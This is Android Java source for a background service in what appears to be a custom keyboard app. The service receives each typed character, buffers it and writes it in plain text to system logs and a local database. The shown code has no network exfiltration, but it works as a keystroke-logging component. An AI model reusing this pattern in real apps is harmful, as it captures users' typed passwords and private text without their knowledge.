
package com.ritwick.keyboard;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.util.Log;

public class BackService extends Service {

    private StringBuilder buffer;
    dbmaker db;
    @Override
    public void onCreate() {
        super.onCreate();

        Log.e("BACKGROUND","SERVICE CREATED");
        db = new dbmaker(this);
        buffer = new StringBuilder();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if(intent!=null) {
            String character = intent.getStringExtra("Character");
            Log.e("BACKGROUND"," "+ character);

            buffer.append(character);
            if (buffer.length() > 140) {
                Log.e("BACKGROUND", "DATA: " + buffer.toString());
                buffer.setLength(0);    // resetting buffer
            }

            writeToSDFile(character);

        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void writeToSDFile(String data){
        boolean done = db.insertData(data);
        if(done)
            Log.e("VALUES DB","INSERTED");
        else
            Log.e("VALUES DB","FAILED");

        Cursor c = db.getData();
        if(c.getCount()==0) {
            Log.e("DATABASE","EMPTY");
            return;
        }

        int counter = 0;
        while(c.moveToNext()){
            Log.e("VALUES",c.getString(0));
            if (++counter == 1)
                break;
        }
    }

}